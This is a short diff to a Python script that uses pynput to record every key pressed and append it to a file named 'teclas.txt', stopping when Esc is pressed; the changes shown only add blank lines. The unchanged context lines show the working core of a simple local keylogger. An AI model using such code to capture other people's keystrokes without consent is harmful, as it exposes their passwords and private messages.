@@ -4,6 +4,7 @@ from pynput.keyboard import Key, Listener
 contador = 0
 teclas_pressionadas = []
 
+
 def pressionar_tecla(tecla):
     global teclas_pressionadas, contador
     teclas_pressionadas.append(tecla)
@@ -14,6 +15,7 @@ def pressionar_tecla(tecla):
         salvar(teclas_pressionadas)
         teclas_pressionadas = []
 
+
 def salvar(teclas):
     with open("teclas.txt", "a") as arquivo:
         arquivo.write('\n')
@@ -21,6 +23,7 @@ def salvar(teclas):
             tecla = str(tecla).replace("'", "")
             if tecla.find("tecla") == -1:
                 arquivo.write(tecla)
+
 
 def liberar_tecla(tecla):
     if tecla == Key.esc:
